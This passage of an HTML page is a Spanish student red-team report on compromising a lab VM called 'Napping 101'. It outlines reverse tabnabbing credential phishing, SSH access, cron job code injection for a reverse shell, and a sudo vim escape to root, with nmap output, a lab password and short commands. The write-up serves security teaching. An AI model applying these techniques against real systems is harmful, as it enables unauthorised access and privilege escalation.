@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actividad 11 - Red Team Report: Napping 101</title>
+    <link rel="stylesheet" href="../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .info-box { text-align:center; border:1px dashed #00ff66; padding:15px; margin-bottom:0; }
+        .info-box p { margin:4px 0; }
+        .risk-badge { display:inline-block; border:2px solid #ff2244; color:#ff2244; font-weight:bold; padding:6px 20px; letter-spacing:3px; margin-top:10px; animation:blink-border 1.8s ease-in-out infinite; }
+        @keyframes blink-border { 0%,100%{box-shadow:0 0 6px #ff2244;} 50%{box-shadow:0 0 20px #ff2244,inset 0 0 10px rgba(255,34,68,.15);} }
+        .team-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:8px; margin-top:14px; }
+        .team-card { border:1px solid rgba(0,255,102,.25); padding:10px 14px; background:rgba(0,255,102,.03); transition:border-color .2s; }
+        .team-card:hover { border-color:rgba(0,255,102,.6); }
+        .team-card.me { border-color:rgba(0,255,102,.55); background:rgba(0,255,102,.06); }
+        .team-card span.name { color:#00ff66; font-weight:bold; }
+        .stat-row { display:flex; flex-wrap:wrap; gap:12px; justify-content:center; margin:16px 0; }
+        .stat-card { background:rgba(0,255,102,.05); border:1px solid rgba(0,255,102,.3); border-top:2px solid #00ff66; padding:14px 20px; text-align:center; min-width:110px; }
+        .stat-card .sv { font-size:1.8rem; font-weight:900; color:#00ff66; line-height:1; }
+        .stat-card .sv.red { color:#ff2244; }
+        .stat-card .sl { font-size:.65rem; color:rgba(0,255,102,.6); letter-spacing:.1em; margin-top:3px; }
+        .terminal { background:rgba(0,0,0,.6); border:1px solid rgba(0,255,102,.2); border-left:3px solid #00ff66; padding:14px 16px; font-size:.78rem; color:#00ff66; overflow-x:auto; line-height:1.75; margin:12px 0; white-space:pre; font-family:'Courier New',monospace; }
+        .terminal.red { border-left-color:#ff2244; color:#ff8888; }
+        .refs-list { list-style:none; display:flex; flex-direction:column; gap:7px; margin-top:10px; }
+        .refs-list li { border-left:3px solid rgba(0,255,102,.3); padding:7px 12px; font-size:.8rem; color:rgba(255,255,255,.75); transition:border-color .2s; }
+        .refs-list li:hover { border-left-color:#00ff66; }
+        .refs-list li a { color:#00cfff; text-decoration:none; }
+        .refs-list li i { color:#00ff66; margin-right:6px; }
+        .concl-box { border:1px solid rgba(0,255,102,.2); padding:20px; margin-bottom:12px; background:rgba(0,255,102,.02); }
+        .concl-box.orange { border-color:rgba(255,106,0,.3); border-top:2px solid #ff6a00; background:rgba(255,106,0,.03); }
+        .concl-box.green { border-top:2px solid #00ff66; }
+        .concl-box h3 { font-size:.82rem; letter-spacing:.12em; margin-bottom:12px; }
+        .concl-box.green h3 { color:#00ff66; } .concl-box.orange h3 { color:#ff6a00; }
+        .concl-box p { font-size:.85rem; color:rgba(255,255,255,.8); margin-bottom:8px; line-height:1.8; }
+        .concl-box p:last-child { margin-bottom:0; }
+        .concl-box strong { color:#00ff66; }
+        .pdf-btn-wrap { text-align:center; padding:16px 0 4px; }
+        .pdf-btn-wrap a { display:inline-flex; align-items:center; gap:8px; background:#00ff66; color:#050d0a; border:none; padding:11px 28px; font-weight:bold; font-size:.9rem; letter-spacing:.1em; text-decoration:none; transition:background .2s,box-shadow .2s; font-family:'Courier New',monospace; }
+        .pdf-btn-wrap a:hover { background:#00cc55; box-shadow:0 0 18px rgba(0,255,102,.4); }
+
+        /* ── específicos act11 ── */
+        .scope-table { width:100%; border-collapse:collapse; font-size:.88rem; margin-top:10px; }
+        .scope-table th { color:#00ff66; text-align:left; padding:8px 12px; border-bottom:1px solid rgba(0,255,102,.3); background:rgba(0,255,102,.06); }
+        .scope-table td { padding:8px 12px; border-bottom:1px solid rgba(0,255,102,.08); color:#fff; opacity:.9; }
+        .scope-table .val { color:#00cfff; }
+        .scope-table .val-crit { color:#ff2244; font-weight:bold; }
+
+        .phases-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(175px,1fr)); gap:10px; margin-top:10px; }
+        .phase-card { border:1px solid rgba(0,255,102,.25); border-top:2px solid #00ff66; padding:16px 12px; text-align:center; background:rgba(0,255,102,.02); transition:all .2s; }
+        .phase-card:hover { border-top-color:#00cfff; transform:translateY(-2px); }
+        .phase-card .pn { font-size:.6rem; color:rgba(0,255,102,.5); letter-spacing:.2em; margin-bottom:6px; }
+        .phase-card .pi { font-size:1.4rem; margin-bottom:6px; }
+        .phase-card .pname { font-weight:bold; color:#fff; margin-bottom:5px; font-size:.9rem; }
+        .phase-card .ptools { font-size:.7rem; color:#00ff66; line-height:1.6; }
+
+        .map-container { border:1px solid rgba(0,255,102,.25); padding:16px; overflow-x:auto; text-align:center; background:rgba(0,0,0,.3); margin-top:10px; }
+
+        /* kill chain horizontal */
+        .kc-wrap { display:flex; align-items:stretch; overflow-x:auto; gap:0; margin-top:12px; padding-bottom:6px; }
+        .kc-step { flex:1; min-width:130px; border:1px solid rgba(0,255,102,.2); border-right:none; padding:14px 10px; position:relative; background:rgba(0,255,102,.02); transition:background .2s; text-align:center; }
+        .kc-step:last-child { border-right:1px solid rgba(0,255,102,.2); }
+        .kc-step:hover { background:rgba(0,255,102,.05); }
+        .kc-step::after { content:'▶'; position:absolute; right:-11px; top:50%; transform:translateY(-50%); color:#00ff66; font-size:.7rem; z-index:2; }
+        .kc-step:last-child::after { display:none; }
+        .kc-step .kn { font-size:.58rem; color:rgba(0,255,102,.5); letter-spacing:.15em; margin-bottom:5px; }
+        .kc-step .ki { font-size:1.3rem; margin-bottom:5px; }
+        .kc-step .kt { font-weight:bold; color:#fff; font-size:.82rem; margin-bottom:4px; }
+        .kc-step .kd { font-size:.65rem; color:#00ff66; line-height:1.5; }
+        .kc-root { min-width:130px; border:1px solid #ff2244; padding:14px 10px; background:rgba(255,34,68,.06); display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; }
+        .kc-root .ki { font-size:1.6rem; color:#ff2244; }
+        .kc-root .kt { font-weight:900; color:#ff2244; font-size:.95rem; margin-top:5px; }
+        .kc-root .kd { font-size:.65rem; color:#ff2244; margin-top:5px; line-height:1.4; }
+
+        /* vuln table */
+        .vuln-table { width:100%; border-collapse:collapse; font-size:.83rem; margin-top:10px; }
+        .vuln-table th { color:#00ff66; text-align:left; padding:9px 11px; font-size:.7rem; letter-spacing:.1em; border-bottom:1px solid rgba(0,255,102,.3); background:rgba(0,255,102,.06); }
+        .vuln-table td { padding:9px 11px; border-bottom:1px solid rgba(0,255,102,.07); color:#fff; opacity:.9; vertical-align:top; }
+        .vuln-table tr:hover td { background:rgba(0,255,102,.02); }
+        .vid { font-size:.72rem; color:rgba(255,255,255,.4); }
+        .badge { display:inline-block; font-size:.62rem; letter-spacing:.07em; padding:1px 7px; border:1px solid; }
+        .badge-crit { color:#ff2244; border-color:#ff2244; background:rgba(255,34,68,.08); }
+        .badge-alto { color:#ff6a00; border-color:#ff6a00; background:rgba(255,106,0,.07); }
+
+        /* CIA */
+        .cia-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(230px,1fr)); gap:12px; margin-top:10px; }
+        .cia-card { border:1px solid rgba(0,255,102,.2); padding:18px; background:rgba(0,255,102,.02); }
+        .cia-letter { font-size:2.4rem; font-weight:900; line-height:1; margin-bottom:2px; opacity:.18; }
+        .cia-card.conf .cia-letter { color:#ff2244; } .cia-card.intg .cia-letter { color:#ff6a00; } .cia-card.avail .cia-letter { color:#ffdd00; }
+        .cia-title { font-weight:bold; color:#fff; margin-bottom:3px; }
+        .cia-badge { display:inline-block; font-size:.6rem; padding:1px 7px; margin-bottom:8px; border:1px solid; }
+        .cia-card.conf .cia-badge { color:#ff2244; border-color:#ff2244; background:rgba(255,34,68,.08); }
+        .cia-card.intg .cia-badge { color:#ff6a00; border-color:#ff6a00; background:rgba(255,106,0,.07); }
+        .cia-card.avail .cia-badge { color:#ffdd00; border-color:#ffdd00; background:rgba(255,221,0,.06); }
+        .cia-text { font-size:.82rem; color:rgba(255,255,255,.75); }
+
+        /* recs */
+        .rec-list { display:flex; flex-direction:column; gap:8px; margin-top:10px; }
+        .rec-item { border:1px solid rgba(0,255,102,.18); padding:12px 14px; display:flex; gap:12px; background:rgba(0,255,102,.02); transition:border-color .2s; }
+        .rec-item:hover { border-color:rgba(0,255,102,.4); }
+        .rec-id { min-width:65px; }
+        .rec-badge { display:block; font-size:.58rem; padding:2px 5px; text-align:center; margin-bottom:3px; border:1px solid; }
+        .rec-badge.crit { color:#ff2244; border-color:#ff2244; background:rgba(255,34,68,.08); }
+        .rec-badge.alto { color:#ff6a00; border-color:#ff6a00; background:rgba(255,106,0,.07); }
+        .rec-num { font-size:.7rem; color:rgba(255,255,255,.4); }
+        .rec-title { font-weight:bold; color:#fff; font-size:.88rem; margin-bottom:2px; }
+        .rec-desc { font-size:.8rem; color:rgba(255,255,255,.7); }
+        .rec-desc code { color:#00ff66; }
+
+        /* roadmap */
+        .roadmap-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(190px,1fr)); gap:10px; margin-top:10px; }
+        .rm-col { border:1px solid rgba(0,255,102,.18); padding:14px; background:rgba(0,255,102,.02); }
+        .rm-phase { font-size:.6rem; letter-spacing:.14em; margin-bottom:8px; display:block; font-weight:bold; }
+        .rm-phase.imm { color:#ff2244; } .rm-phase.short { color:#ff6a00; } .rm-phase.lng { color:#00ff66; }
+        .rm-item { font-size:.77rem; color:rgba(255,255,255,.75); padding:5px 0; border-bottom:1px solid rgba(0,255,102,.05); }
+        .rm-item:last-child { border-bottom:none; }
+        .rm-item i { color:#00ff66; margin-right:4px; font-size:.68rem; }
+
+        /* mocks */
+        .mock-window { border:1px solid rgba(0,255,102,.25); overflow:hidden; margin-top:10px; }
+        .mock-bar { background:rgba(0,0,0,.5); padding:5px 10px; font-size:.65rem; color:rgba(0,255,102,.5); border-bottom:1px solid rgba(0,255,102,.15); }
+        .mock-bar.red { border-bottom-color:rgba(255,34,68,.2); }
+        .mock-body { padding:14px; background:rgba(0,0,0,.4); }
+
+        /* vuln dist */
+        .vuln-dist { display:flex; flex-wrap:wrap; gap:10px; margin:10px 0 18px; }
+        .vd { flex:1; min-width:100px; text-align:center; border:1px solid; padding:10px 14px; }
+        .vd.crit { border-color:#ff2244; background:rgba(255,34,68,.06); } .vd.crit .vn,.vd.crit .vl { color:#ff2244; }
+        .vd.alto  { border-color:#ff6a00; background:rgba(255,106,0,.05); } .vd.alto  .vn,.vd.alto  .vl { color:#ff6a00; }
+        .vd .vn { font-size:1.7rem; font-weight:900; line-height:1; }
+        .vd .vl { font-size:.62rem; letter-spacing:.1em; margin-top:3px; }
+
+        /* tabnabbing explain */
+        .tabnab-explain { display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); gap:14px; margin-top:12px; }
+        .tb-step { border:1px solid rgba(0,255,102,.2); padding:16px; background:rgba(0,255,102,.02); position:relative; }
+        .tb-step .ts-num { font-size:.6rem; color:rgba(0,255,102,.5); letter-spacing:.2em; margin-bottom:6px; }
+        .tb-step .ts-icon { font-size:1.5rem; margin-bottom:6px; }
+        .tb-step .ts-title { font-weight:bold; color:#fff; font-size:.88rem; margin-bottom:5px; }
+        .tb-step .ts-desc { font-size:.78rem; color:rgba(255,255,255,.7); line-height:1.6; }
+        .tb-step .ts-arrow { position:absolute; right:-12px; top:50%; transform:translateY(-50%); color:#00ff66; font-size:.8rem; z-index:2; }
+
+        @media(max-width:700px){
+            .kc-wrap { flex-direction:column; }
+            .kc-step::after { content:'▼'; right:50%; bottom:-11px; top:auto; transform:translateX(50%); }
+            .kc-step { border-right:1px solid rgba(0,255,102,.2); border-bottom:none; }
+            .kc-step:last-child { border-bottom:1px solid rgba(0,255,102,.2); }
+        }
+    </style>
+</head>
+<body>
+<canvas id="matrix-left"></canvas>
+<canvas id="matrix-right"></canvas>
+
+<header>
+    <h1>Actividad 11 - Red Team Report: Pentesting de Napping 101</h1>
+    <nav><a href="../actividades.html"><i class="fas fa-arrow-left"></i> Volver a Actividades</a></nav>
+</header>
+
+<main>
+
+<!-- ══ PORTADA ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <div class="info-box">
+        <p><strong>CNO V: SEGURIDAD INFORMÁTICA</strong></p>
+        <p><strong>Docente:</strong> Mtro. Servando López Contreras &nbsp;|&nbsp; <strong>Grupo:</strong> T46B &nbsp;|&nbsp; <strong>Parcial:</strong> 2</p>
+        <p><strong>Actividad:</strong> 11 — Red Team Report: Pentesting de Napping 101</p>
+        <p><strong>Fecha:</strong> 22 de marzo de 2026</p>
+        <div class="risk-badge">⚠ RIESGO GLOBAL: CRÍTICO</div>
+    </div>
+    <div class="stat-row">
+        <div class="stat-card"><div class="sv red">4</div><div class="sl">VULNERABILIDADES</div></div>
+        <div class="stat-card"><div class="sv red">2</div><div class="sl">CRÍTICAS</div></div>
+        <div class="stat-card"><div class="sv red">ROOT</div><div class="sl">NIVEL ACCESO</div></div>
+        <div class="stat-card"><div class="sv">3</div><div class="sl">USUARIOS PIVOTADOS</div></div>
+    </div>
+    <p style="color:#00ff66;font-weight:bold;margin-top:18px;">Equipo 5 — Integrantes:</p>
+    <div class="team-grid">
+        <div class="team-card"><span class="name">Edwin Admael</span> Castillo Gómez — 181700</div>
+        <div class="team-card"><span class="name">Carlos René</span> Castillo Olvera — 182033</div>
+        <div class="team-card"><span class="name">Diego Osvaldo</span> Hernández Fernández — 182217</div>
+        <div class="team-card me"><span class="name">Magdalena Yesenia</span> Tristán Rivera — 174702</div>
+    </div>
+</section>
+
+<!-- ══ 01 RESUMEN EJECUTIVO ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-file-alt"></i> 01 — Resumen Ejecutivo</h2>
+    <p style="color:rgba(255,255,255,.85);line-height:1.85;font-size:.92rem;">
+        Se realizó una evaluación de seguridad ofensiva tipo <strong style="color:#00ff66">Red Team</strong> sobre el servidor corporativo <strong style="color:#00ff66">Napping 101</strong> (IP: <strong style="color:#00ff66">192.168.56.101</strong>). El resultado fue un <strong style="color:#ff2244">compromiso total del sistema</strong>, obteniendo privilegios de <strong style="color:#ff2244">superusuario (root)</strong> y vulnerando completamente el modelo CIA.
+    </p>
+    <br>
+    <p style="color:rgba(255,255,255,.85);line-height:1.85;font-size:.92rem;">
+        La cadena de explotación partió de una vulnerabilidad <strong style="color:#ff2244">Reverse Tabnabbing</strong> en el portal web, que permitió interceptar credenciales del administrador mediante una página de login falsa. Con esas credenciales se estableció acceso SSH como usuario <em>daniel</em>, se pivoteó a <em>adrian</em> inyectando código en un cron job vulnerable, y finalmente se escaló a <strong style="color:#ff2244">root</strong> explotando una configuración insegura de sudo con <code style="color:#00ff66">vim NOPASSWD</code>.
+    </p>
+
+    <!-- Visual resumen cadena -->
+    <div class="map-container" style="margin-top:16px;">
+        <svg viewBox="0 0 760 90" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:760px;font-family:'Courier New',monospace;">
+            <rect width="760" height="90" fill="#050d0a"/>
+            <defs>
+                <marker id="arw" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#00ff66"/></marker>
+                <marker id="arwr" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#ff2244"/></marker>
+            </defs>
+            <!-- boxes -->
+            <rect x="5"   y="20" width="110" height="50" rx="3" fill="#0d1a10" stroke="#00ff66" stroke-width="1.2"/>
+            <text x="60"  y="42" text-anchor="middle" fill="#00ff66" font-size="9" font-weight="bold">TABNABBING</text>
+            <text x="60"  y="55" text-anchor="middle" fill="#5aac80" font-size="8">window.opener</text>
+            <text x="60"  y="65" text-anchor="middle" fill="#5aac80" font-size="7">Phishing dirigido</text>
+            <line x1="115" y1="45" x2="140" y2="45" stroke="#00ff66" stroke-width="1.5" marker-end="url(#arw)"/>
+
+            <rect x="140" y="20" width="110" height="50" rx="3" fill="#0d1a10" stroke="#00ff66" stroke-width="1.2"/>
+            <text x="195" y="42" text-anchor="middle" fill="#00ff66" font-size="9" font-weight="bold">CREDENCIALES</text>
+            <text x="195" y="55" text-anchor="middle" fill="#5aac80" font-size="8">daniel</text>
+            <text x="195" y="65" text-anchor="middle" fill="#5aac80" font-size="7">C@ughtm3napping123</text>
+            <line x1="250" y1="45" x2="275" y2="45" stroke="#00ff66" stroke-width="1.5" marker-end="url(#arw)"/>
+
+            <rect x="275" y="20" width="110" height="50" rx="3" fill="#0d1a10" stroke="#00ff66" stroke-width="1.2"/>
+            <text x="330" y="42" text-anchor="middle" fill="#00ff66" font-size="9" font-weight="bold">SSH FOOTHOLD</text>
+            <text x="330" y="55" text-anchor="middle" fill="#5aac80" font-size="8">daniel@napping</text>
+            <text x="330" y="65" text-anchor="middle" fill="#5aac80" font-size="7">puerto 22</text>
+            <line x1="385" y1="45" x2="410" y2="45" stroke="#ff6a00" stroke-width="1.5" marker-end="url(#arw)"/>
+
+            <rect x="410" y="20" width="110" height="50" rx="3" fill="#1a0d04" stroke="#ff6a00" stroke-width="1.2"/>
+            <text x="465" y="42" text-anchor="middle" fill="#ff6a00" font-size="9" font-weight="bold">CRON HIJACK</text>
+            <text x="465" y="55" text-anchor="middle" fill="#ff9966" font-size="8">query.py + os.system</text>
+            <text x="465" y="65" text-anchor="middle" fill="#ff9966" font-size="7">reverse shell → adrian</text>
+            <line x1="520" y1="45" x2="545" y2="45" stroke="#ff2244" stroke-width="1.5" marker-end="url(#arwr)"/>
+
+            <rect x="545" y="20" width="110" height="50" rx="3" fill="#200408" stroke="#ff2244" stroke-width="2"/>
+            <text x="600" y="38" text-anchor="middle" fill="#ff2244" font-size="9" font-weight="bold">VIM SUDO</text>
+            <text x="600" y="51" text-anchor="middle" fill="#ff5566" font-size="8">NOPASSWD breakout</text>
+            <text x="600" y="63" text-anchor="middle" fill="#ff2244" font-size="9" font-weight="bold">whoami = root</text>
+
+            <text x="380" y="12" text-anchor="middle" fill="#5aac80" font-size="7" letter-spacing="2">CADENA DE EXPLOTACION — 4 PASOS AL ROOT</text>
+        </svg>
+    </div>
+</section>
+
+<!-- ══ 02 ALCANCE ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-crosshairs"></i> 02 — Alcance (Scope)</h2>
+    <table class="scope-table">
+        <tr><th>CAMPO</th><th>VALOR</th></tr>
+        <tr><td>Objetivo</td><td class="val">Napping 101 — Servidor corporativo</td></tr>
+        <tr><td>IP Objetivo</td><td class="val">192.168.56.101</td></tr>
+        <tr><td>IP Atacante (Auditor)</td><td class="val">192.168.56.102</td></tr>
+        <tr><td>Sistema Operativo</td><td class="val">Ubuntu 20.04.3 LTS (Focal Fossa) — Kernel 5.4.0-89-generic x86_64</td></tr>
+        <tr><td>Tipo de Red</td><td class="val">Host-Only (VirtualBox) — Segmento 192.168.56.0/24</td></tr>
+        <tr><td>Servicios evaluados</td><td class="val">HTTP puerto 80 · SSH puerto 22</td></tr>
+        <tr><td>Tipo de evaluación</td><td class="val">Red Team — Black Box · Sin credenciales previas</td></tr>
+        <tr><td>Metodología</td><td class="val">PTES + OWASP Testing Guide</td></tr>
+        <tr><td>Fuera de alcance</td><td class="val">DoS/DDoS · Ingeniería social física · Otros segmentos de red</td></tr>
+        <tr><td>Período</td><td class="val">19–22 de marzo de 2026</td></tr>
+        <tr><td>Resultado</td><td class="val-crit">COMPROMISO TOTAL — ROOT OBTENIDO ✓</td></tr>
+    </table>
+
+    <!-- Red Diagram -->
+    <div class="map-container" style="margin-top:14px;">
+        <svg viewBox="0 0 680 170" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:680px;font-family:'Courier New',monospace;">
+            <rect width="680" height="170" fill="#050d0a"/>
+            <defs>
+                <pattern id="g11" width="35" height="35" patternUnits="userSpaceOnUse"><path d="M 35 0 L 0 0 0 35" fill="none" stroke="#00ff6605" stroke-width="1"/></pattern>
+                <filter id="gl11"><feGaussianBlur stdDeviation="3" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+                <filter id="gr11"><feGaussianBlur stdDeviation="4" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+                <marker id="a11" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#00ff66"/></marker>
+            </defs>
+            <rect width="680" height="170" fill="url(#g11)"/>
+            <text x="340" y="16" text-anchor="middle" fill="#5aac80" font-size="8" letter-spacing="2">TOPOLOGIA — RED HOST-ONLY VIRTUALBOX</text>
+            <!-- KALI attacker -->
+            <circle cx="120" cy="90" r="48" fill="#0d1a10" stroke="#00ff66" stroke-width="1.5" filter="url(#gl11)"/>
+            <text x="120" y="82" text-anchor="middle" fill="#00ff66" font-size="10" font-weight="bold">KALI LINUX</text>
+            <text x="120" y="96" text-anchor="middle" fill="#5aac80" font-size="9">192.168.56.102</text>
+            <text x="120" y="108" text-anchor="middle" fill="#5aac80" font-size="8">eth0 / HOST-ONLY</text>
+            <!-- arrow -->
+            <line x1="168" y1="90" x2="240" y2="90" stroke="#00ff66" stroke-width="1.8" stroke-dasharray="7,4" marker-end="url(#a11)"/>
+            <text x="204" y="82" text-anchor="middle" fill="#00ff66" font-size="8">ATTACK</text>
+            <!-- NAPPING server -->
+            <circle cx="300" cy="90" r="52" fill="#0d1208" stroke="#ff2244" stroke-width="2" filter="url(#gr11)"/>
+            <text x="300" y="78" text-anchor="middle" fill="#00ff66" font-size="10" font-weight="bold">NAPPING 101</text>
+            <text x="300" y="92" text-anchor="middle" fill="#5aac80" font-size="9">192.168.56.101</text>
+            <text x="300" y="104" text-anchor="middle" fill="#ff2244" font-size="8">COMPROMISED</text>
+            <text x="300" y="116" text-anchor="middle" fill="#ff5566" font-size="7">Ubuntu 20.04.3 LTS</text>
+            <!-- services -->
+            <!-- HTTP -->
+            <rect x="390" y="30" width="95" height="42" rx="3" fill="#1a0408" stroke="#ff2244" stroke-width="1.2"/>
+            <text x="437" y="50" text-anchor="middle" fill="#ff2244" font-size="11">🌐</text>
+            <text x="437" y="62" text-anchor="middle" fill="#ff4466" font-size="8" font-weight="bold">HTTP :80</text>
+            <text x="437" y="72" text-anchor="middle" fill="#ff6677" font-size="7">Apache 2.4.41</text>
+            <line x1="352" y1="70" x2="390" y2="60" stroke="#ff224440" stroke-width="1.2" stroke-dasharray="4,2"/>
+            <!-- SSH -->
+            <rect x="390" y="98" width="95" height="42" rx="3" fill="#0d1a10" stroke="#ff6a00" stroke-width="1.2"/>
+            <text x="437" y="118" text-anchor="middle" fill="#ff6a00" font-size="11">🔐</text>
+            <text x="437" y="130" text-anchor="middle" fill="#ff8833" font-size="8" font-weight="bold">SSH :22</text>
+            <text x="437" y="140" text-anchor="middle" fill="#ff9966" font-size="7">OpenSSH 8.2p1</text>
+            <line x1="352" y1="110" x2="390" y2="120" stroke="#ff6a0040" stroke-width="1.2" stroke-dasharray="4,2"/>
+            <!-- users inside server -->
+            <rect x="525" y="25" width="140" height="120" rx="4" fill="rgba(0,0,0,.3)" stroke="rgba(0,255,102,.15)" stroke-width="1"/>
+            <text x="595" y="40" text-anchor="middle" fill="#5aac80" font-size="7" letter-spacing="1">USUARIOS INTERNOS</text>
+            <rect x="535" y="48" width="120" height="22" rx="2" fill="#0d1a10" stroke="#00ff66" stroke-width="1"/>
+            <text x="595" y="63" text-anchor="middle" fill="#00ff66" font-size="8" font-weight="bold">daniel</text>
+            <rect x="535" y="78" width="120" height="22" rx="2" fill="#1a0d04" stroke="#ff6a00" stroke-width="1"/>
+            <text x="595" y="93" text-anchor="middle" fill="#ff6a00" font-size="8" font-weight="bold">adrian (cron job)</text>
+            <rect x="535" y="108" width="120" height="28" rx="2" fill="#200408" stroke="#ff2244" stroke-width="1.5"/>
+            <text x="595" y="123" text-anchor="middle" fill="#ff2244" font-size="9" font-weight="bold">root</text>
+            <text x="595" y="133" text-anchor="middle" fill="#ff5566" font-size="7">vim NOPASSWD</text>
+        </svg>
+    </div>
+</section>
+
+<!-- ══ 03 METODOLOGÍA ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-project-diagram"></i> 03 — Metodología Aplicada (PTES + OWASP)</h2>
+    <div class="phases-grid">
+        <div class="phase-card"><div class="pn">FASE 01</div><div class="pi">🔍</div><div class="pname">Reconocimiento</div><div class="ptools">netdiscover<br>nmap -p- -sV<br>nmap -A<br>Host: 192.168.56.101</div></div>
+        <div class="phase-card"><div class="pn">FASE 02</div><div class="pi">🔎</div><div class="pname">Enumeración</div><div class="ptools">Gobuster (fallido)<br>OWASP DirBuster<br>Análisis HTML fuente<br>Cookie PHPSESSID audit</div></div>
+        <div class="phase-card"><div class="pn">FASE 03</div><div class="pi">💥</div><div class="pname">Explotación</div><div class="ptools">Reverse Tabnabbing<br>payload.html<br>python3 http.server<br>nc -lvnp 8080</div></div>
+        <div class="phase-card"><div class="pn">FASE 04</div><div class="pi">↔️</div><div class="pname">Movimiento Lateral</div><div class="ptools">SSH daniel@.56.101<br>query.py injection<br>os.system() RCE<br>reverse shell → adrian</div></div>
+        <div class="phase-card"><div class="pn">FASE 05</div><div class="pi">🔥</div><div class="pname">Escalada Privilegios</div><div class="ptools">sudo -l audit<br>vim NOPASSWD<br>sudo vim -c':!/bin/sh'<br>whoami = root ✓</div></div>
+        <div class="phase-card"><div class="pn">FASE 06</div><div class="pi">📄</div><div class="pname">Post-Explotación</div><div class="ptools">del_users.py análisis<br>MySQL hardcoded creds<br>TRUNCATE TABLE users<br>Impacto documentado</div></div>
+    </div>
+</section>
+
+<!-- ══ 04 RECON + NMAP ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-search"></i> 04 — Reconocimiento — Netdiscover + Nmap</h2>
+
+    <div class="terminal">$ sudo netdiscover -r 192.168.56.0/24
+4 Captured ARP Req/Rep packets, from 3 hosts.
+IP              At MAC Address     Count  Len  MAC Vendor / Hostname
+192.168.56.101  08:00:27:49:ee:4d    1     60  PCS Systemtechnik GmbH  ← OBJETIVO
+192.168.56.100  08:00:27:c8:ee:92    2    120  PCS Systemtechnik GmbH
+192.168.56.1    0a:00:27:00:00:0f    1     60  Unknown vendor
+
+$ nmap -p- -sV 192.168.56.101
+PORT   STATE  SERVICE  VERSION
+22/tcp open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
+80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))
+MAC Address: 08:00:27:49:EE:4D (PCS Systemtechnik/Oracle VirtualBox NIC)
+
+$ nmap -A 192.168.56.101
+|_http-title: Login
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set              ← ALERTA: Cookie vulnerable</div>
+
+    <!-- Network scan visual -->
+    <div class="map-container" style="margin-top:12px;">
+        <svg viewBox="0 0 680 110" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:680px;font-family:'Courier New',monospace;">
+            <rect width="680" height="110" fill="#050d0a"/>
+            <text x="340" y="16" text-anchor="middle" fill="#5aac80" font-size="8" letter-spacing="2">PUERTOS DESCUBIERTOS — SUPERFICIE DE ATAQUE</text>
+            <!-- port 22 -->
+            <rect x="60" y="25" width="240" height="72" rx="4" fill="#0d1a10" stroke="#ff6a00" stroke-width="1.5"/>
+            <text x="90" y="48" fill="#ff6a00" font-size="22">🔐</text>
+            <text x="130" y="45" fill="#ff6a00" font-size="12" font-weight="bold">Puerto 22 / TCP</text>
+            <text x="130" y="60" fill="#ff8833" font-size="9">SSH — OpenSSH 8.2p1</text>
+            <text x="130" y="74" fill="#5aac80" font-size="8">Ubuntu 4ubuntu0.3 · protocolo 2.0</text>
+            <text x="130" y="88" fill="#ff9966" font-size="7">Vector: Acceso remoto con credenciales</text>
+            <!-- port 80 -->
+            <rect x="380" y="25" width="240" height="72" rx="4" fill="#1a0408" stroke="#ff2244" stroke-width="1.5"/>
+            <text x="410" y="48" fill="#ff2244" font-size="22">🌐</text>
+            <text x="450" y="45" fill="#ff2244" font-size="12" font-weight="bold">Puerto 80 / TCP</text>
+            <text x="450" y="60" fill="#ff4466" font-size="9">HTTP — Apache httpd 2.4.41</text>
+            <text x="450" y="74" fill="#5aac80" font-size="8">Ubuntu · Cookie PHPSESSID sin HttpOnly</text>
+            <text x="450" y="88" fill="#ff5566" font-size="7">CRÍTICO: Vector Reverse Tabnabbing</text>
+        </svg>
+    </div>
+</section>
+
+<!-- ══ 05 ENUMERACIÓN WEB ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-globe"></i> 05 — Enumeración Web — DirBuster + Cookie Audit</h2>
+    <p style="font-size:.85rem;color:rgba(255,255,255,.7);margin-bottom:10px;">Se identificó portal de login en puerto 80. Gobuster con rockyou.txt falló por falsos positivos 200 con tamaño idéntico. OWASP DirBuster con <code style="color:#00ff66">apache-user-enum-2.0.txt</code> descubrió los archivos clave.</p>
+
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px;margin-top:10px;">
+        <!-- Portal mock -->
